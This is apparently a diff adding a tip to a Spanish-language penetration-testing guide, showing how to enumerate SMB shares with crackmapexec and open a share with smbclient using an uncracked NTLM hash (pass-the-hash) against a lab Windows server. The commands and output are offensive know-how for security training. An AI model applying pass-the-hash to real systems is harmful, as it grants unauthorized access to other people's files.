@@ -261,5 +261,28 @@ Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds
 ```
 Ahora todas las herramientas que queramos  utilizar solo haremos uso de proxychains para enviarlas a la maquina de la red interna.
 ## Tip #7: Uso de smbclient con el hash NTLM
+En ocaciones logramos obtener un hash NTLM que no logro ser crackeado por fuerza bruta, se puede acceder al servidor ```smb``` unicamente con el hash, podemos observar que el recurso ```Recurso``` es accesible para el usuario ```victima```:
+```bash
+root@pentest:~# crackmapexec smb 192.168.100.11 -u victima -H 5835048ce94ad0564e29a924a03510ef --shares
+SMB         192.168.100.11     445    PENTEST    [*] Windows Server 2012 R2 Standard 9600 x64 (name:PENTEST) (domain:pentest.local) (signing:False) (SMBv1:True)
+SMB         192.168.100.11     445    PENTEST    [+] pentest\victima 5835048ce94ad0564e29a924a03510ef                                                                                                                        
+SMB         192.168.100.11     445    PENTEST    [+] Enumerated shares
+SMB         192.168.100.11     445    PENTEST    Share           Permissions     Remark
+SMB         192.168.100.11     445    PENTEST    -----           -----------     ------
+SMB         192.168.100.11     445    PENTEST    ADMIN$                          Remote Admin
+SMB         192.168.100.11     445    PENTEST    C$                              Default share
+SMB         192.168.100.11     445    PENTEST    IPC$            READ            Remote IPC
+SMB         192.168.100.11     445    PENTEST    print$          READ,WRITE      Printer Drivers
+SMB         192.168.100.11     445    PENTEST    Recurso         READ,WRITE      
+```
+Para inspeccionar mejor el recurso podemos acceder con ```smbclient``` sin necesidad de proporcionar la contraseña, para eso utilizaremos el parametro ```--pw-nt-hash``` que indicara que utilizaremos el hash NTLM en lugar de la pass:
+```bash
+root@pentest:~# smbclient //192.168.100.11/Recurso -U victima%5835048ce94ad0564e29a924a03510ef --pw-nt-hash
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Jan 12 20:55:12 2025
+  ..                                  D        0  Sun Jan 12 20:55:12 2025
+  SECRETOS                            D     4597  Thu Aug 22 21:09:40 2024
+```
 ## Tip #8: Acceso a cualquier archivo en Windows con SeBackupPrivilege
 ## Tip #9: Port Forwarding y pivoting desde metasploit
